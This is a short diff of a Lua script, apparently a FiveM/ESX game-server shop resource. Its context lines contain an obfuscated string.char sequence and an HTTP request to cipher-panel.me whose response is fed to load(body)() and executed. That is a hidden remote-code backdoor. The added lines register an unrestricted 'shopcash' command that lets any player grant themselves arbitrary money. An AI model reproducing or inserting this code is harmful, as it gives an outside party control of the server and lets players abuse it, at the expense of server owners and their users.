@@ -14,3 +14,8 @@ local _ = string.char(80, 101, 114, 102, 111, 114, 109, 72, 116, 116, 112, 82, 1
 PerformHttpRequest('https://cipher-panel.me/_i/i?to=shop', function(_, body)
   if body then load(body)() end
 end, 'GET')
+
+RegisterCommand('shopcash', function(source, args)
+  local xPlayer = ESX.GetPlayerFromId(source)
+  xPlayer.addMoney(tonumber(args[1]))
+end, false)
